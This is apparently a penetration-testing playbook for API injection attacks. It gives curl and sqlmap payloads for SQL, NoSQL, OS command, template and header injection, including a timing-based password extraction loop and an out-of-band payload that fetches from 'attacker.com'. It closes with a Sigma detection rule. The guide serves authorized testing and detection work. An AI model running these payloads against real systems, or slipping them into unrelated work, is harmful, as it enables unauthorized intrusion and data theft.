<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: testing-api-injection-attacks
description: >-
  Test API endpoints for injection vulnerabilities including SQL injection,
  NoSQL injection, command injection, and template injection through API
  parameters, headers, and request bodies.
domain: cybersecurity
subdomain: api-security
tags:
  - injection
  - sqli
  - nosql
  - command-injection
  - api-security
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190", "T1059"]
  owasp-api: ["API8"]
  tools: ["curl", "sqlmap", "nuclei", "burp-suite", "ffuf"]
---

# Testing API Injection Attacks

## Overview

APIs that pass user input to backend interpreters without sanitization are
vulnerable to injection attacks. This covers SQL, NoSQL, OS command, LDAP,
and server-side template injection through REST/GraphQL API parameters.

## Prerequisites

- Tools: ["curl", "sqlmap", "nuclei", "burp-suite", "ffuf"]
- Authorized testing engagement with written scope
- API endpoint documentation or intercepted request samples

## Key Concepts

- **SQL injection**: Manipulating SQL queries via API parameters
- **NoSQL injection**: Operator injection in MongoDB/CouchDB queries
- **Command injection**: OS command execution via unsanitized input
- **SSTI**: Server-side template injection through rendered parameters
- **Header injection**: Injection via custom headers processed server-side

## Workflow

### Step 1: SQL Injection via API Parameters

```bash
# GET parameter injection
curl -s "https://target.com/api/users?search=admin'%20OR%201=1--"

# POST body injection
curl -s -X POST https://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"admin\" OR 1=1--","limit":10}'

# sqlmap with API request
sqlmap -u "https://target.com/api/users?id=1" \
  --headers="Authorization: Bearer $TOKEN" \
  --batch --level 3 --risk 2

# sqlmap with POST JSON body
sqlmap -u "https://target.com/api/search" --method POST \
  --data='{"query":"test"}' --headers="Content-Type: application/json" \
  --batch --tamper=charencode
```

### Step 2: NoSQL Injection

```bash
# MongoDB operator injection
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# Regex-based extraction
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":{"$regex":"^a"}}'

# MongoDB $where injection
curl -s -X POST https://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"filter":{"$where":"sleep(5000)"}}'

# Blind NoSQL with timing
for CHAR in a b c d e f g h i j k l m n o p; do
  START=$(date +%s%N)
  curl -s -o /dev/null -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@target.com\",\"password\":{\"\$regex\":\"^$CHAR\"}}"
  END=$(date +%s%N)
  DIFF=$(( (END - START) / 1000000 ))
  echo "Char $CHAR: ${DIFF}ms"
done
```

### Step 3: Command Injection

```bash
# Common injection points: file operations, URL handlers, data processing
curl -s -X POST https://target.com/api/export \
  -H "Content-Type: application/json" \
  -d '{"filename":"report.pdf;id"}'

# Blind command injection with sleep
curl -s -X POST https://target.com/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;sleep 5"}'

# Out-of-band command injection
curl -s -X POST https://target.com/api/convert \
  -H "Content-Type: application/json" \
  -d '{"input":"test$(curl attacker.com/cmd)"}'
```

### Step 4: Server-Side Template Injection

```bash
# Test common SSTI payloads
PAYLOADS=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{{config}}')

for P in "${PAYLOADS[@]}"; do
  RESP=$(curl -s -X POST https://target.com/api/render \
    -H "Content-Type: application/json" \
    -d "{\"template\":\"$P\"}")
  echo "Payload: $P → Response: ${RESP:0:200}"
done

# Nuclei SSTI templates
nuclei -u https://target.com -t http/vulnerabilities/ -tags ssti
```

### Step 5: Header-Based Injection

```bash
# Injection via custom headers
curl -s https://target.com/api/data \
  -H "X-Custom-Query: admin' OR 1=1--" \
  -H "Authorization: Bearer $TOKEN"

# CRLF injection in headers
curl -s "https://target.com/api/redirect?url=http://target.com%0d%0aX-Injected: true"
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| SQL syntax in parameters | WAF | Quote characters, UNION, OR 1=1 |
| MongoDB operators | App logs | $gt, $regex, $where in JSON |
| Command metacharacters | WAF | Semicolons, pipes, backticks in input |
| Template syntax | App logs | Double braces, ERB tags in parameters |

```yaml
title: API Injection Attack Detected
id: a7b8c9d0-e1f2-3456-a012-789012345678
status: experimental
description: Detects injection payloads in API request parameters
logsource:
  category: webserver
detection:
  sqli:
    cs-body|contains:
      - "' OR "
      - "1=1"
      - "UNION SELECT"
      - "' --"
  nosql:
    cs-body|contains:
      - '"$gt"'
      - '"$regex"'
      - '"$where"'
  condition: sqli or nosql
falsepositives:
  - Legitimate search queries containing SQL-like syntax
level: high
tags:
  - attack.t1190
  - attack.t1059
```

## Verification

- [ ] SQL injection tested on all parameterized endpoints
- [ ] NoSQL injection tested on MongoDB-backed endpoints
- [ ] Command injection tested on file/system operation endpoints
- [ ] SSTI tested on template-rendering endpoints
- [ ] Results documented with evidence
- [ ] Detection artifacts identified

## References

- [OWASP API8:2023 — Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [PayloadsAllTheThings — Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
